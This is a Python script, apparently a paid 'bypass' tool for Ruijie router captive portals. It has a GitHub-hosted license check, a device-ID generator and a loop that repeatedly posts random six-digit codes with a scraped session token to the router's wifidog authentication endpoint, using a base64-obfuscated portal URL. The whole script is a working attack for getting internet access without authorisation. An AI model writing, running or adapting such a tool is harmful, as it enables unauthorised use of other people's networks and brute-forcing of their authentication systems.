import os
import re
import sys
import uuid
import time
import json
import zlib
import ntplib
import ping3
import base64
import random
import string
import urllib
import hashlib
import asyncio
import aiohttp
import requests
import argparse
import marshal
import subprocess
from datetime import datetime
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION (မင်းပေးထားတဲ့ Link အတိုင်း အတိအကျပါ) ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
ID_STORAGE = ".moeyu_device_id"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def clear():
    os.system("clear")

def Line():
    print(f"{y}─" * os.get_terminal_size()[0])

def get_hwid():
    """ID ကို အသေသိမ်းထားပြီး ပြန်ထုတ်ပေးသည့်စနစ်"""
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    else:
        user = os.popen('whoami').read().strip()
        model = os.popen('getprop ro.product.model').read().strip()
        raw = f"{user}-{model}-{random.randint(100000, 999999)}"
        new_id = hashlib.md5(raw.encode()).hexdigest().upper()
        with open(ID_STORAGE, "w") as f:
            f.write(new_id)
        return new_id

def Logo():
    clear()
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
{g}         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    Line()
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    Line()

def check_key():
    """GitHub Database မှ Key ကို စစ်ဆေးခြင်း"""
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying Secure License...{w}")
    try:
        # Cache မငြိအောင် No-cache headers သုံးသည်
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        # URL အနောက်မှာ Timestamp ထည့်ပြီး Cache ကိုကျော်သည်
        res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
        
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    # Space များကို အလိုအလျောက် ဖြတ်ထုတ်ရန် strip() သုံးထားသည်
                    parts = line.strip().split("|")
                    db_key = parts[0].strip()
                    exp_str = parts[1].strip()
                    
                    if db_key == my_id:
                        today = datetime.now().date()
                        expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                        if today <= expiry:
                            print(f"{g}[+] Access Authorized! Welcome Moe Yu.{w}")
                            time.sleep(1.5)
                            return True
                        else:
                            print(f"{r}[!] YOUR LICENSE HAS EXPIRED!{w}")
                            sys.exit()
            
            print(f"{r}[!] UNREGISTERED ID!{w}")
            print(f"{y}[>] Your ID: {c}{my_id}{w}")
            print(f"{y}[>] Add this ID to GitHub key.txt precisely.")
            sys.exit()
        else:
            print(f"{r}[!] Server Error: {res.status_code}{w}")
            sys.exit()
    except:
        print(f"{r}[!] Connection Failed! Check your internet.{w}")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: print(f"{r}[!] Run -o setup first!"); sys.exit()

    async def execute(self):
        Logo()
        print(f"{y}[*] Running Background Bypass Loop...{w}")
        async with aiohttp.ClientSession() as session:
            loop_idx = 0
            while True:
                if loop_idx % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                        p = await asyncio.to_thread(ping3.ping, 'google.com')
                        p_fmt = f"{g}{int(p*1000)}ms" if p else f"{r}Timeout"
                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status} | Ping: {p_fmt}")
                except: pass
                await asyncio.sleep(1)
                loop_idx += 1

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup"], required=True)
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            with open(".ip", "w") as f: f.write(gw)
            print(f"{g}[+] Setup Successful!{w}")
        except: print(f"{r}[!] Setup Failed. Check WiFi connection.")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Tool Stopped.{w}")
